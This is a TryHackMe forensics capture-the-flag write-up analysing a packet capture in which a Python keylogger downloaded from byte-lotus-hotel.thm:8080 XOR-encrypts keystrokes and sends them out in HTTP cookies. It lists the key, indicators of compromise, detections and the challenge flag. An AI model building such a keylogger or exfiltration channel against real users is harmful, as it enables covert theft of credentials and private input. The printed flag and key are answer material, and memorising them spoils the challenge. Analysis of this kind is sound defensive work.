# TryHackMe - PackedLight (Forensics) Writeup

## Challenge Overview

Today we are back with another **TryHackMe** challenge named **PackedLight**, which focuses on **Network Forensics** and **Malware Traffic Analysis**.

The objective of this challenge is to analyze a packet capture (`.pcapng`) file, identify suspicious network activity, understand the malware's behavior, and recover the exfiltrated data.

---

# Scenario

After downloading the challenge, we receive the following archive:

```bash
file packed-light-forensics-1784224937659.zip
```

Output:

```text
packed-light-forensics-1784224937659.zip: Zip archive data, made by v2.0 UNIX, extract using at least v2.0, last modified Jun 17 2026 01:40:16, uncompressed size 556132, method=deflate
```

After extracting the archive, we obtain the packet capture that will be analyzed using **Wireshark**.

---

## Challenge Story

> Tiny packets. Odd hours. Suspiciously regular.
>
> Someone's smuggling out the data equivalent of a hotel towel every night, folded neatly inside traffic that looks ordinary until you decode it.
>
> A short capture from the guest network is all VERA could pull before the connection dropped.
>
> Somewhere in that traffic, a quiet little errand is running on a loop, and it isn't part of any service the hotel actually offers.

---

## @0xMia's Story

> "Not me watching my laptop ping some random :8080 address every single second like clockwork 🚩
>
> The request headers are giving 'not a real app' ngl.
>
> Also what is with the crypto 😭"

---

# Initial Analysis

Opening the capture in **Wireshark** immediately reveals continuous HTTP traffic being generated toward a suspicious server running on **port 8080**.

The requests occur repeatedly and at regular intervals, indicating automated activity rather than normal user interaction.

---

# Host Information

| Item | Value |
|------|-------|
| Operating System | Windows 11 (64-bit) |
| Build | 26200 |
| Capture Tool | Dumpcap 4.6.1 |
| Network Adapters | Ethernet, Windows Loopback Adapter |

---

# Suspicious HTTP Download

The first interesting observation is a download of a Python script.

### HTTP Request

```http
GET /temp/updates.py HTTP/1.1
Host: byte-lotus-hotel.thm:8080
```

### HTTP Response

```http
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.11.2
Content-Type: text/x-python
```

This indicates that the victim downloads a Python file named **updates.py**, which later turns out to be the malware responsible for the malicious activity.

---

# Malware Analysis

Inspecting the downloaded Python script reveals that it is a **keylogger**.

The script imports the following modules:

```python
import requests
import base64
from pynput import keyboard
```

## Malware Functionality

- Captures every keyboard event
- XOR encrypts each keystroke
- Encodes the encrypted data using Base64
- Sends the encoded data to a remote HTTP server

This represents a lightweight yet effective keylogging implant.

---

# Command and Control (C2)

The malware communicates with the following server:

```text
http://byte-lotus-hotel.thm:8080/
```

Rather than sending captured data inside the HTTP body, every captured keystroke generates a request similar to:

```http
GET /
```

with the following header:

```http
Cookie: hotel_sess_state=<base64_encoded_data>
```

Using cookies for exfiltration is a stealth technique that allows attackers to blend malicious traffic with normal HTTP requests.

---

# Encryption Mechanism

The malware encrypts every captured character using XOR before transmitting it.

## XOR Key

```text
H0t3lSt@ff0NlyK3epS3cr3t!
```

## Data Flow

```text
Keyboard Input
      │
      ▼
UTF-8 Encoding
      │
      ▼
XOR Encryption
      │
      ▼
Base64 Encoding
      │
      ▼
HTTP Cookie
      │
      ▼
Remote Server
```

---

# User-Agent Analysis

Two different User-Agent strings appear throughout the capture.

## Normal Browser

```text
Mozilla/5.0
Chrome/149
```

## Malware Client

```text
Mozilla/5.0
ByteLotusClient/1.1
```

The custom User-Agent clearly identifies malware-generated traffic and serves as an excellent Indicator of Compromise (IOC).

---

# Indicators of Compromise (IOCs)

| Indicator | Value |
|-----------|-------|
| Domain | byte-lotus-hotel.thm |
| Port | 8080 |
| Downloaded File | /temp/updates.py |
| Cookie Name | hotel_sess_state |
| User-Agent | ByteLotusClient/1.1 |
| Python Modules | requests, pynput, base64 |

---

# Keylogger Behaviour

The malware continuously monitors keyboard activity and immediately transmits each captured key.

Captured input includes:

- Standard keyboard characters
- Space key
- Enter key

Unlike many keyloggers, this malware does **not** batch keystrokes together. Every key press generates its own outbound HTTP request.

---

# Recovering the Secret

Using the XOR key extracted from the malware and decoding the Base64 values transmitted inside the cookies, the captured keystrokes reconstruct the following secret:

```text
THM{V3r4_1s_w4tch1ng_0veR_y0u}
```

This confirms successful exfiltration of sensitive information from the victim system.

---

# Additional Network Traffic

The packet capture also contains multicast discovery traffic.

Destination:

```text
239.255.255.250:1900
```

Observed services include:

- upnp:rootdevice
- WFADevice
- WFAWLANConfig

These packets correspond to legitimate SSDP/UPnP network discovery and are unrelated to the malicious activity.

---

# MITRE ATT&CK Mapping

| Technique | Description |
|-----------|-------------|
| T1056.001 | Keylogging |
| T1105 | Ingress Tool Transfer |
| T1041 | Exfiltration Over Command and Control Channel |
| T1071.001 | Application Layer Protocol (HTTP) |
| T1027 | Obfuscated Files or Information |

---

# Detection Opportunities

Network defenders can detect this activity by monitoring for:

- HTTP communication with `byte-lotus-hotel.thm:8080`
- Downloads of `/temp/updates.py`
- Repeated HTTP GET requests containing the `hotel_sess_state` cookie
- Presence of the custom User-Agent `ByteLotusClient/1.1`
- Frequent outbound HTTP requests containing short Base64-encoded cookie values
- Python processes importing both `pynput` and `requests`
- Unusual periodic HTTP beaconing to the same destination

---

# Attack Flow

```text
Victim Machine
      │
      ▼
Download updates.py
      │
      ▼
Python Keylogger Executes
      │
      ▼
Capture Keystrokes
      │
      ▼
XOR Encrypt Data
      │
      ▼
Base64 Encode
      │
      ▼
Store in HTTP Cookie
      │
      ▼
HTTP GET Request
      │
      ▼
Command & Control Server
```

---

# Conclusion

The **PackedLight** challenge demonstrates how a seemingly harmless HTTP request can conceal malicious activity.

The attacker delivers a lightweight Python keylogger, captures every keystroke, encrypts the data using XOR, Base64-encodes the result, and quietly exfiltrates it through HTTP cookies to a remote server. Although the traffic appears relatively normal, careful packet inspection reveals multiple Indicators of Compromise, including a custom User-Agent, suspicious HTTP requests, encoded cookie values, and periodic beaconing behavior.

By reversing the encoding process with the recovered XOR key, the transmitted keystrokes can be reconstructed, ultimately revealing the challenge flag:

```text
THM{V3r4_1s_w4tch1ng_0veR_y0u}
```

This challenge highlights the importance of packet analysis, malware behavior analysis, and identifying covert data exfiltration techniques that abuse common application-layer protocols such as HTTP.
